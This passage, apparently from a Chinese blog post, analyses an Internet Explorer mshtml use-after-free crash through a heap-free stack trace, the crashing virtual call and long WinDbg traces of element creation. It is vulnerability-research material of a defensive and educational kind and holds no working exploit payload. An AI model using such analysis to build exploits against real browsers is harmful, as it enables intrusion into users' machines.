771fa0aa ntdll!RtlpFreeHeap+0x0000005d</span><br><span class="line">    771c65a6 ntdll!RtlFreeHeap+0x00000142</span><br><span class="line">    7601bbe4 kernel32!HeapFree+0x00000014</span><br><span class="line">    6865c83a mshtml!CGenericElement::`scalar deleting destructor&apos;+0x0000003d</span><br><span class="line">    68711daf mshtml!CBase::SubRelease+0x00000022</span><br><span class="line">    6870a6b5 mshtml!CElement::PrivateRelease+0x0000002a</span><br><span class="line">    68707894 mshtml!PlainRelease+0x00000025</span><br><span class="line">    68753862 mshtml!PlainTrackerRelease+0x00000014</span><br><span class="line">    6bf3a735 jscript!VAR::Clear+0x0000005f</span><br><span class="line">    6bf56e46 jscript!GcContext::Reclaim+0x000000b6</span><br><span class="line">    6bf543e9 jscript!GcContext::CollectCore+0x00000123</span><br><span class="line">    6bfb83f0 jscript!JsCollectGarbage+0x0000001d</span><br><span class="line">    6bf4758c jscript!NameTbl::InvokeInternal+0x00000141</span><br><span class="line">    6bf44f84 jscript!VAR::InvokeByDispID+0x0000017f</span><br><span class="line">    6bf4e4c7 jscript!CScriptRuntime::Run+0x00002b80</span><br><span class="line">    6bf45d7d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce</span><br><span class="line">    6bf45cdb jscript!ScrFncObj::Call+0x0000008d</span><br><span class="line">    6bf45ef1 jscript!CSession::Execute+0x0000015f</span><br><span class="line">    6bf4620a jscript!COleScript::ExecutePendingScripts+0x000001bd</span><br><span class="line">    6bf4c3b9 jscript!COleScript::ParseScriptTextCore+0x000002a4</span><br><span class="line">    6bf4c1d1 jscript!COleScript::ParseScriptText+0x00000030</span><br><span class="line">    686ef774 mshtml!CScriptCollection::ParseScriptText+0x00000218</span><br><span class="line">    686ef58c mshtml!CScriptElement::CommitCode+0x000003c2</span><br><span class="line">    686ef34f mshtml!CScriptElement::Execute+0x000000c6</span><br><span class="line">    686d2d52 mshtml!CHtmParse::Execute+0x0000004a</span><br><span class="line">    686cc36a mshtml!CHtmPost::Broadcast+0x0000000f</span><br><span class="line">    686cceba mshtml!CHtmPost::Exec+0x000005f7</span><br><span class="line">    686ce945 mshtml!CHtmPost::Run+0x00000015</span><br><span class="line">    686ce8a9 mshtml!PostManExecute+0x000001fb</span><br><span class="line">    686ce80e mshtml!PostManResume+0x000000f7</span><br></pre></td></tr></table></figure></p><p>下面来看下触发崩溃的指令的附近指令，很明显 <code>ecx</code> 是一个对象的地址，<code>mov     eax,dword ptr [ecx]</code> 后 <code>eax</code> 为虚表地址，之后取偏移 <code>0x70</code> 调用虚函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; u <span class="number">6870b</span>68d </span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line"><span class="number">6870b</span>68d <span class="number">8b</span>01            mov     eax,dword ptr [ecx]</span><br><span class="line"><span class="number">6870b</span>68f <span class="number">8b</span>5070          mov     edx,dword ptr [eax+<span class="number">70</span>h]</span><br><span class="line"><span class="number">6870b</span>692 ffd2            call    edx</span><br><span class="line"><span class="number">6870b</span>694 <span class="number">8b</span>400c          mov     eax,dword ptr [eax+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">6870b</span>697 c3              ret</span><br><span class="line"><span class="number">6870b</span>698 <span class="number">90</span>              nop</span><br><span class="line"><span class="number">6870b</span>699 <span class="number">90</span>              nop</span><br><span class="line"><span class="number">6870b</span>69a <span class="number">90</span>              nop</span><br></pre></td></tr></table></figure></p><h2 id="DOM树创建"><a href="#DOM树创建" class="headerlink" title="DOM树创建"></a>DOM树创建</h2><p>先看下 <code>poc</code> 中的第一条 <code>js</code> 语句<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f0=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span><br></pre></td></tr></table></figure></p><p>可以通过 <code>windbg</code> 的 <code>x</code> 命令查询与 <code>document.createElement</code> 相关的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*document*createElement*</span><br><span class="line">68665e8d mshtml!CDocument::createElement = &lt;no type information&gt;</span><br><span class="line">68716ec0 mshtml!s_methdescCDocumentcreateElement = &lt;no type information&gt;</span><br><span class="line">68665ee6 mshtml!CDocument::CreateElementHelper = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>可以猜测 <code>mshtml!CDocument::createElement</code> 和 <code>mshtml!CDocument::CreateElementHelper</code> 函数和 <code>document.createElement</code> 有关，实际上也是由 <code>mshtml!CDocument::createElement</code> 去调用 <code>mshtml!CDocument::CreateElementHelper</code> 完成的。使用 <code>windbg</code> 对 <code>CDocument::createElement</code> 函数下断点，单步调试分析其功能，通过调试可以发现 <code>CDocument::createElement</code> 函数中实际创建元素的函数是 <code>CDocument::CreateElementHelper</code> 之后会调用所创建元素虚表偏移处 <code>0xd8</code> 和 <code>0xe0</code> 处的函数，如在上面的调试中调用的是创建 <code>span</code> 元素后的虚表中的 <code>mshtml!CXDomainRequest::QueryInterface</code> 和 <code>mshtml!CDomPrototype::Release</code> 函数，之后调用 <code>CBase::SetErrorInfo</code> 函数。注释见下图<br><img src="http://static.zybuluo.com/dane909/ga15fw57jtvgrtcqssudgo3g/2018-07-11_142334.png" alt="2018-07-11_142334.png-75.8kB"><br>下面再来分析下 <code>mshtml!CDocument::CreateElementHelper</code> 函数。调试时遇到的一个问题是 <code>ida</code> 通过 <code>mshtml</code> 的 <code>pdb</code> 自动识别出来的变量和 <code>windbg</code> 的变量有区别，感觉 <code>ida</code> 错啦。对比如下<br><img src="http://static.zybuluo.com/dane909/qc34h8hxv0btlr8508pru85j/xxx.png" alt="xxx.png-58.3kB"></p><p><img src="http://static.zybuluo.com/dane909/2l0volz3oyozjlprnkrwsee4/4239479238.png" alt="4239479238.png-11.6kB"></p><p>后面分析的时候我是按照 <code>windbg</code> 的类型来分析的。实际上在调试过程中主要的指令如下:<br><img src="http://static.zybuluo.com/dane909/a4b1ot509avnm1wg1jw6c3dw/4293089432123.png" alt="4293089432123.png-15.3kB"><br>其实就是先调用 <code>CDocument::Markup(void)</code> 获得 <code>CMarkup</code> 对象，然后通过 <code>CMarkup::CreateElement()</code> 创建新的元素。调试信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; p</span><br><span class="line">eax=00000004 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f28 esp=0456d034 ebp=0456d048 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x45:</span><br><span class="line">68665f28 e813770a00      call    mshtml!CDocument::Markup (6870d640)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f2d esp=0456d034 ebp=0456d048 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4a:</span><br><span class="line">68665f2d 50              push    eax</span><br><span class="line">0:005&gt; ln poi(eax)</span><br><span class="line">(68701f30)   mshtml!CMarkup::`vftable&apos;   |  (68702028)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f2e esp=0456d030 ebp=0456d048 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4b:</span><br><span class="line">68665f2e 33c0            xor     eax,eax</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f30 esp=0456d030 ebp=0456d048 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4d:</span><br><span class="line">68665f30 e84bfeffff      call    mshtml!CMarkup::CreateElement (68665d80)</span><br><span class="line">0:005&gt; dd esp L1</span><br><span class="line">0456d030  0589ef30</span><br><span class="line">0:005&gt; ln poi(0589ef30) </span><br><span class="line">(68701f30)   mshtml!CMarkup::`vftable&apos;   |  (68702028)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=0456d58c ecx=0591bfd8 edx=68711db9 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f35 esp=0456d040 ebp=0456d048 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x52:</span><br><span class="line">68665f35 8bf0            mov     esi,eax</span><br></pre></td></tr></table></figure></p><p>继续动态调试 <code>CMarkup::CreateElement</code> 函数。发现实际上又调用了 <code>CreateElement</code> 函数去做处理。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">682</span>C5E1D                 push    <span class="number">1</span>               ; <span class="class"><span class="keyword">struct</span> <span class="title">CMarkup</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E1F                 push    <span class="number">0</span>               ; <span class="class"><span class="keyword">struct</span> <span class="title">CDoc</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E21                 push    ecx             ; <span class="class"><span class="keyword">struct</span> <span class="title">CElement</span> **</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E22                 push    eax             ; <span class="class"><span class="keyword">struct</span> <span class="title">CHtmTag</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span><span class="function">C5E23                 call    <span class="title">CreateElement</span><span class="params">(CHtmTag *,CElement * *,CDoc *,CMarkup *,<span class="keyword">int</span> *,ulong)</span></span></span><br></pre></td></tr></table></figure></p><p>继续跟踪 <code>CreateElement</code> 函数。下面是部分调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=0472d56c ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd6fa esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x1d:</span><br><span class="line">686cd6fa 0fb64701        movzx   eax,byte ptr [edi+1]       ds:0023:060fcf01=74</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000074 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd6fe esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x21:</span><br><span class="line">686cd6fe c1e004          shl     eax,4</span><br><span class="line">0:005&gt; r eax</span><br><span class="line">eax=00000074</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000740 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd701 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CreateElement+0x24:</span><br><span class="line">686cd701 0520397268      add     eax,offset mshtml!g_atagdesc (68723920)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd706 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x29:</span><br><span class="line">686cd706 0f8405691100    je      mshtml!CreateElement+0x2b (687e4011)    [br=0]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=68724060 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd70c esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x38:</span><br><span class="line">686cd70c 8b4008          mov     eax,dword ptr [eax+8] ds:0023:68724068=&#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=04098fc0 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd70f esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3b:</span><br><span class="line">686cd70f 8d4d10          lea     ecx,[ebp+10h]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd712 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3e:</span><br><span class="line">686cd712 51              push    ecx</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd713 esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x3f:</span><br><span class="line">686cd713 52              push    edx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd714 esp=0472d520 ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x40:</span><br><span class="line">686cd714 57              push    edi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686977d2 ebx=04098fc0 ecx=0472d550 edx=06e09680 esi=04098ef8 edi=060fcf00</span><br><span class="line">eip=686cd715 esp=0472d51c ebp=0472d540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CreateElement+0x41:</span><br><span class="line">686cd715 ffd0            call    eax &#123;mshtml!CCommentElement::CreateElement (686977d2)&#125;</span><br><span class="line">...................................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=00000065 edx=00000004 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd729 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x4d:</span><br><span class="line">686cd729 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=00000004 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd72c esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x50:</span><br><span class="line">686cd72c 8b11            mov     edx,dword ptr [ecx]  ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd72e esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x52:</span><br><span class="line">686cd72e 8b4210          mov     eax,dword ptr [edx+10h] ds:0023:685557a8=&#123;mshtml!CElement::Init (686c9f5d)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=686c9f5d ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd731 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x55:</span><br><span class="line">686cd731 ffd0            call    eax &#123;mshtml!CElement::Init (686c9f5d)&#125;</span><br><span class="line">........................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd748 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x64:</span><br><span class="line">686cd748 8b5510          mov     edx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74b esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x67:</span><br><span class="line">686cd74b 51              push    ecx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74c esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x68:</span><br><span class="line">686cd74c 57              push    edi</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74d esp=0472d520 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x69:</span><br><span class="line">686cd74d 52              push    edx</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=04098fc0 ecx=0839ef30 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd74e esp=0472d51c ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x6a:</span><br><span class="line">686cd74e e85b000000      call    mshtml!CElement::InitAttrBag (686cd7ae)</span><br><span class="line">......................................</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=00000000 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd76e esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x82:</span><br><span class="line">686cd76e 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0472d550=05ff2fc8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd771 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x85:</span><br><span class="line">686cd771 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0472d538=00000000</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd774 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x88:</span><br><span class="line">686cd774 897df4          mov     dword ptr [ebp-0Ch],edi ss:0023:0472d534=0472d548</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=05ff2fc8 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd777 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x8b:</span><br><span class="line">686cd777 8b11            mov     edx,dword ptr [ecx]  ds:0023:05ff2fc8=&#123;mshtml!CCommentElement::`vftable&apos; (68555798)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=68555798 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd779 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x8d:</span><br><span class="line">686cd779 8b92f8000000    mov     edx,dword ptr [edx+0F8h] ds:0023:68555890=&#123;mshtml!CElement::Init2 (686ca047)&#125;</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0839ef30 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd77f esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x93:</span><br><span class="line">686cd77f 8d45f4          lea     eax,[ebp-0Ch]</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd782 esp=0472d528 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x96:</span><br><span class="line">686cd782 50              push    eax</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0472d534 ebx=04098fc0 ecx=05ff2fc8 edx=686ca047 esi=00000000 edi=060fcf00</span><br><span class="line">eip=686cd783 esp=0472d524 ebp=0472d540 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  